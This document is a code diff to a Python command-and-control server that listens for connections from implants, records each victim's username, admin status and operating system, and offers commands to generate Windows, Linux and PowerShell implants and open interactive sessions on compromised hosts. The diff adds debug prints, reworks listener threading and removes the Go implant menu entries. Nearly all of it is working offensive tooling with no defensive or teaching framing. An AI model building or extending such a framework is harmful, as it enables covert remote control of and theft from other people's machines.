@@ -7,11 +7,16 @@ import socket
 import string
 import subprocess
 import threading
+from _thread import *
 import time
 from pathlib import Path
 
 from rich.console import Console
 from rich.table import Table
+
+host_ip = ''
+host_port = 0
+listener_counter = 0
 
 
 def generate_plant(plant_type):
@@ -51,7 +56,7 @@ def exeplant():
     generate_plant("winplant")
 
     if not Path(file_name).exists():
-        print('[-] Some error occured during generation')
+        print('[-] Some error occurred during generation')
         return
 
     os.chdir(check_cwd / 'payloads/')
@@ -65,7 +70,7 @@ def exeplant():
     if Path(check_cwd / 'payloads/' / exe_file).exists():
         print(f'[+] {exe_file} saved to {check_cwd}/payloads/.')
     else:
-        print('[-] Some error occured during generation.')
+        print('[-] Some error occurred during generation.')
 
 
 def powershell_cradle():
@@ -94,9 +99,9 @@ def listener_handler(host_ip, host_port):
     sock.bind((host_ip, int(host_port)))
     print('[+] Awaiting connection from client...')
     sock.listen()
-
-    t1 = threading.Thread(target=communication_handler)
-    t1.start()
+    start_new_thread(communication_handler, ())
+    # t1 = threading.Thread(target=communication_handler)
+    # t1.start()
 
 
 def help():
@@ -116,11 +121,8 @@ def help():
     Payload Commands
     ---------------------------------------------------------------------------------------
     winplant py                       --> Windows Python Implant
-    winplang go                       --> Windows Golang Implant
-    exeplant go                       --> Windows Executable Implant (Golang)
     exeplant py                       --> Windows Executable Implant (Python)
     linplant py                       --> Linux Python Implant
-    linplang go                       --> Linux Golang Implant
     pshell_shell                      --> Powershell Implant
     
     Client Commands
@@ -183,23 +185,24 @@ def target_comm_channel(target_id, targets, num):
 
 def communication_handler():
     while True:
-        if kill_flag == 1:
-            break
         try:
+            print("comm")
             remote_target, remote_ip = sock.accept()
-
+            print(remote_target, remote_ip)
             username = base64.b64decode(remote_target.recv(1024).decode()).decode()
             admin = base64.b64decode(remote_target.recv(1024).decode()).decode()
             op_sys = base64.b64decode(remote_target.recv(1024).decode()).decode()
 
             admin_value = 'Yes' if admin == 1 or username == 'root' else 'No'
             pay_val = 1 if 'Windows' in op_sys else 2
-
+            print(username, admin, op_sys, admin_value, pay_val)
             current_time = time.strftime("%H:%M:%S", time.localtime())
-            date = datetime.now()
+            print(current_time)
+            date = datetime.date.today()
+            print(date)
             time_record = f"{date.month}/{date.day}/{date.year} {current_time}"
             host_name = socket.gethostbyaddr(remote_ip[0])
-
+            print(current_time, date, time_record, host_name)
             if host_name is not None:
                 targets.append(
                     [remote_target, f"{host_name[0]}@{remote_ip[0]}", time_record, username, admin_value, op_sys,
@@ -210,7 +213,7 @@ def communication_handler():
 
             print(f'\n[+] Connection received from {host_name[0]}@{remote_ip[0]}\n' + 'Enter command#> ', end="")
         except:
-            pass
+            print("no")
 
 
 def banner():
@@ -247,8 +250,8 @@ def handle_command(command, targets, sock, listener_counter, kill_flag):
         help()
     elif command == 'exit':
         handle_exit(targets, sock, listener_counter, kill_flag)
-    elif command == 'listeners -g':
-        handle_listener(sock, listener_counter)
+    elif command.startswith('listeners'):
+        listener_counter = handle_listener(command, listener_counter)
     elif command in ['winplant py', 'linplant py', 'exeplant']:
         handle_payload(command, listener_counter)
     elif command == 'pshell_shell':
@@ -259,6 +262,8 @@ def handle_command(command, targets, sock, listener_counter, kill_flag):
         handle_kill(command, targets)
     else:
         print('Invalid command, please try again.')
+
+    return listener_counter
 
 
 def handle_exit(targets, sock, listener_counter, kill_flag):
@@ -274,16 +279,23 @@ def handle_exit(targets, sock, listener_counter, kill_flag):
         if listener_counter > 0:
             sock.close()
         print('[+] You can close this window now.')
+        exit()
 
 
-def handle_listener(sock, listener_counter):
-    host_ip = input('[+] Enter the IP address to listen on: ')
-    host_port = input('[+] Enter the port to listen on: ')
-    listener_handler(host_ip, host_port)
-    listener_counter += 1
+def handle_listener(command, listener_counter):
+    global host_ip, host_port
+    if command.split(" ")[1] == '-g' or command.split(" ")[1] == '--generate':
+        host_ip = input('[+] Enter the IP address to listen on: ')
+        host_port = input('[+] Enter the port to listen on: ')
+        x = threading.Thread(target=listener_handler, args=(host_ip, host_port))
+        x.start()
+        listener_counter += 1
+        return listener_counter
+
 
 
 def handle_payload(command, listener_counter):
+
     if listener_counter > 0:
         if command == 'winplant py':
             winplant()
@@ -340,6 +352,8 @@ def display_sessions(targets):
 
 def handle_interactive_session(command, targets):
     try:
+        if not command.split(" ")[2]:
+            return
         num = int(command.split(" ")[2])
         target_id = (targets[num])[0]
         if (targets[num][7]) == 'Active':
@@ -353,13 +367,12 @@ def handle_interactive_session(command, targets):
 if __name__ == '__main__':
     banner()
     targets = []
-    listener_counter = 0
     kill_flag = 0
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
     while True:
         try:
             command = input('Enter command#> ')
-            handle_command(command, targets, sock, listener_counter, kill_flag)
+            listener_counter = handle_command(command, targets, sock, listener_counter, kill_flag)
         except KeyboardInterrupt:
             handle_exit(targets, sock, listener_counter, kill_flag)
